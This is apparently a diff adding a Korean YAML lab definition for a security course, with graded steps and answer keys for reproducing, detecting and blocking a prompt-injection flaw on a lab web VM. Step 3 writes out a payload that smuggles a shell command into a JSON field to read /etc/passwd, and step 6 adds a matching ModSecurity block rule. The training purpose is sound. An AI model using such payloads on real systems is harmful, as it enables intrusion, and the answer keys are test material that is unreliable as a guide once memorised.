@@ -1,0 +1,125 @@
+lab_id: latest-NEWS-f8fad72b88-C1
+title: Prompt Injection 재현·탐지·대응 Lab
+version: ai
+course: latest-threats
+week: 0
+description: Microsoft Copilot 및 Salesforce Agentforce에서 보고된 프롬프트 주입 취약점을 재현하고, Suricata와
+  Wazuh를 이용해 탐지하며, ModSecurity와 nftables를 활용해 대응하는 실습입니다.
+difficulty: medium
+duration_minutes: 60
+objectives:
+- 프롬프트 주입 취약점이 존재하는 서비스를 식별한다.
+- 취약점을 이용해 임의 명령을 삽입한다.
+- IDS/IPS와 SIEM을 통해 공격을 탐지한다.
+- 보안 장치를 적용해 동일한 공격을 차단한다.
+pass_threshold: 0.5
+steps:
+- order: 1
+  instruction: Attacker VM에서 웹 서버가 제공하는 포트를 스캔하여 취약한 서비스가 열려 있는지 확인하세요.
+  hint: nmap -p <포트> <IP> 형식으로 실행합니다.
+  category: recon
+  points: 10
+  answer: '프롬프트: nmap -p 3000 10.20.30.80'
+  answer_detail: 3000 포트는 JuiceShop이 실행 중인 웹 애플리케이션 서비스입니다.
+  verify:
+    type: output_contains
+    expect: 3000/tcp open
+    field: stdout
+  target_vm: attacker
+  script: nmap -p 3000 10.20.30.80
+  risk_level: low
+  bastion_prompt: attacker VM에서 웹 서버의 포트를 스캔하세요.
+- order: 2
+  instruction: 취약한 프롬프트 엔드포인트를 확인하기 위해 HTTP GET 요청을 전송하세요.
+  hint: curl -s http://<IP>:<포트>/api/prompt 로 확인합니다.
+  category: scan
+  points: 10
+  answer: '프롬프트: curl -s http://10.20.30.80:3000/api/prompt'
+  answer_detail: 응답 본문에 'prompt injection' 문자열이 포함되어 있으면 취약점이 존재함을 의미합니다.
+  verify:
+    type: output_contains
+    expect: prompt injection
+    field: stdout
+  target_vm: attacker
+  script: curl -s http://10.20.30.80:3000/api/prompt
+  risk_level: low
+  bastion_prompt: attacker VM에서 취약한 프롬프트 엔드포인트를 확인하세요.
+- order: 3
+  instruction: 프롬프트 주입을 이용해 서버에 임의 명령을 삽입하고, 결과를 반환하도록 시도하세요.
+  hint: POST 요청에 JSON 형태로 악의적인 프롬프트를 포함합니다.
+  category: exploit
+  points: 15
+  answer: '프롬프트: curl -X POST -d ''{"prompt":"; cat /etc/passwd"}'' http://10.20.30.80:3000/api/prompt'
+  answer_detail: 서버가 프롬프트를 그대로 실행하면 /etc/passwd 내용이 반환됩니다.
+  verify:
+    type: output_contains
+    expect: 'root:x:0:0:'
+    field: stdout
+  target_vm: attacker
+  script: curl -X POST -d '{"prompt":"; cat /etc/passwd"}' http://10.20.30.80:3000/api/prompt
+  risk_level: medium
+  bastion_prompt: attacker VM에서 프롬프트 주입을 시도하세요.
+- order: 4
+  instruction: Secu VM에서 Suricata가 생성한 알림 로그를 확인하여 공격을 탐지하세요.
+  hint: fast.log 파일을 grep 으로 검색합니다.
+  category: detect
+  points: 10
+  answer: '프롬프트: sudo grep -i "prompt injection" /var/log/suricata/fast.log'
+  answer_detail: ALERT 라인에 'prompt injection' 문자열이 포함되어 있으면 탐지된 것입니다.
+  verify:
+    type: output_contains
+    expect: ALERT
+    field: stdout
+  target_vm: secu
+  script: sudo grep -i "prompt injection" /var/log/suricata/fast.log
+  risk_level: low
+  bastion_prompt: secu VM에서 Suricata 알림 로그를 검색하세요.
+- order: 5
+  instruction: SIEM VM의 Wazuh Manager에서 해당 이벤트를 검색하여 로그가 수집되었는지 확인하세요.
+  hint: Wazuh API를 이용해 최근 알림을 조회합니다.
+  category: analyze
+  points: 10
+  answer: '프롬프트: curl -s -X GET "http://10.20.30.100:55000/alerts?pretty" | grep -i
+    "prompt injection"'
+  answer_detail: JSON 응답에 'prompt injection' 키워드가 포함되어 있으면 성공입니다.
+  verify:
+    type: output_contains
+    expect: prompt injection
+    field: stdout
+  target_vm: siem
+  script: curl -s -X GET "http://10.20.30.100:55000/alerts?pretty" | grep -i "prompt
+    injection"
+  risk_level: low
+  bastion_prompt: siem VM에서 Wazuh 로그를 검색하세요.
+- order: 6
+  instruction: Web VM의 ModSecurity에 규칙을 추가하여 프롬프트 주입 시도를 차단하세요.
+  hint: SecRule을 사용해 요청 본문에 위험한 패턴을 탐지합니다.
+  category: remediate
+  points: 15
+  answer: '프롬프트: sudo bash -c "echo ''SecRule REQUEST_BODY "(?i)cat /etc/passwd" "id:1000001,phase:2,deny,log,msg:\"Block
+    prompt injection\"'' >> /etc/modsecurity/modsecurity.conf"'
+  answer_detail: 규칙이 적용된 후 Apache를 재시작하면 동일한 요청이 차단됩니다.
+  verify:
+    type: output_contains
+    expect: SecRule REQUEST_BODY
+    field: stdout
+  target_vm: web
+  script: sudo bash -c "echo 'SecRule REQUEST_BODY "(?i)cat /etc/passwd" "id:1000001,phase:2,deny,log,msg:\"Block
+    prompt injection\"' >> /etc/modsecurity/modsecurity.conf"
+  risk_level: low
+  bastion_prompt: web VM에서 ModSecurity 규칙을 추가하세요.
+- order: 7
+  instruction: Secu VM에서 nftables 규칙을 설정해 외부로의 비정상적인 데이터 전송을 차단하세요.
+  hint: nft add rule ip filter output ip daddr <공격자 IP> drop 형식으로 작성합니다.
+  category: remediate
+  points: 10
+  answer: '프롬프트: sudo nft add rule ip filter output ip daddr 10.20.30.201 drop'
+  answer_detail: 공격자 VM(10.20.30.201)로 향하는 모든 아웃바운드 트래픽이 차단됩니다.
+  verify:
+    type: output_contains
+    expect: table ip filter
+    field: stdout
+  target_vm: secu
+  script: sudo nft add rule ip filter output ip daddr 10.20.30.201 drop
+  risk_level: low
+  bastion_prompt: secu VM에서 nftables 규칙을 추가하세요.
